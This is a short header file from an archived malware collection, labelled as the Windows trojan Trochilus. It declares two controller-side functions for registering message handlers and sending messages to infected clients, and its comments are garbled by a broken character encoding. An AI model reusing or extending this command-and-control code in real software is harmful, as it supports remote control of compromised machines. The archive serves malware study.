/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once

//ע����Ϣ�����ص�����
MASTER2_API void RegisterCommMsgHandler(MSGID msgid, FnMsgHandler fnHandler, LPVOID lpParameter);

//��ͻ��˷�����Ϣ������ʹ��CommDataUtils�еı�������
MASTER2_API MSGSERIALID SendMessage2Client(LPCTSTR clientid, const LPBYTE pData, DWORD dwSize, BOOL bNeedReply);